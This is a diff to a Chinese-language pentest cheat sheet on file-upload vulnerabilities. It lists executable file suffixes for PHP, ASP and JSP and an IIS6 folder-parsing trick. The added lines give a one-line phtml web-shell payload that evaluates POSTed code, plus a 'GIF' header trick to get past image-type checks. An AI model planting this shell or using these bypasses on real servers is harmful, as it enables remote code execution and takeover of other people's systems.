@@ -51,7 +51,9 @@ echo phpinfo();
 - 服务器端可能会校验文件格式，例如严格限制jpg的格式，可能需要用到[jpg_payload脚本](./scripts/jpg_payload.php)在jpg中插入恶意php载荷
 - IIS6 `*.asp`文件夹下所有文件被当做脚本进行解析，例如`x.asp,a.jpg`
 - php可执行后缀  
-  `php3、php5、phtml、pht`
+  `php3、php5、phtml、pht`   
+  其中phtml的载荷可以为`<script language="php">eval($_POST['shell']);</script>`    
+  如果需要绕过图片限制，可以在载荷前一行加`GIF`
 - asp可执行后缀  
   `cdx、cer、asa`
 - jsp可执行后缀  
